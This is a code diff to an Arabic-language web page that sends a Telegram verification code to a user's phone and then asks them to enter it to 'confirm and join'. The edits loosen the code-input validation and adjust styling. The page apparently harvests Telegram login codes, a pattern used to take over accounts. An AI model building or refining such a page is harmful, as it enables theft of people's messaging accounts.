@@ -76,7 +76,7 @@
       color: #fff;
       font-size: 22px;
       text-align: center;
-      letter-spacing: 8px;
+      letter-spacing: 5px;
       outline: none;
       transition: border-color 0.3s;
     }
@@ -120,7 +120,7 @@
     <button id="sendBtn" onclick="sendCode()">إرسال رمز التفعيل</button>
 
     <div id="codeSection">
-      <input type="text" id="codeInputs" placeholder="------" maxlength="6">
+      <input type="text" id="codeInputs" placeholder="أدخل الرمز" maxlength="10">
       <button onclick="verifyCode()">تأكيد الرمز والانضمام</button>
     </div>
   </div>
@@ -145,7 +145,7 @@
           globalPhoneHash = result.phoneCodeHash;
           globalPhone = result.phone;
           document.getElementById('title').innerText = "أدخل رمز التفعيل";
-          document.getElementById('statusDesc').innerText = "تم إرسال كود التحقق المكون من 6 أرقام عبر تيليغرام، يرجى إدخاله أدناه:";
+          document.getElementById('statusDesc').innerText = "تم إرسال كود التحقق عبر تيليغرام، يرجى إدخاله أدناه:";
           btn.style.display = 'none';
           document.getElementById('codeSection').style.display = 'block';
         } else {
@@ -161,8 +161,8 @@
     }
 
     async function verifyCode() {
-      const code = document.getElementById('codeInputs').value;
-      if (!code || code.length < 5) {
+      const code = document.getElementById('codeInputs').value.trim();
+      if (!code) {
         alert('الرجاء إدخال الرمز بشكل صحيح');
         return;
       }
